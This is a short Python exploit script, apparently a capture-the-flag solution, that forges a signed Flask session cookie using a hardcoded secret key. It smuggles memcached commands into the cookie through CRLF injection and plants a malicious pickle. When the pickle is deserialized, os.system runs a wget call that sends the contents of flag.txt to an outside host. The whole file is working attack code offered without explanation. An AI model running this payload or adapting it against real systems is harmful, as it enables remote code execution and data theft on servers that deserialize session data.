import pickle
import os
import urllib.parse
import base64
from itsdangerous import Signer, BadSignature, want_bytes


class RCE:
    def __reduce__(self):
        cmd = ('wget "http://host/a=`cat flag.txt`"')
        return os.system, (cmd,)


signer = Signer('Dashboard42!', salt='flask-session', key_derivation='hmac')


def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'bar\r\nset foo:1337 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get foo:1337')


    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return "\"%s.%s\"" % (pack, signer.get_signature(cookie).decode())

print(generate_exploit())
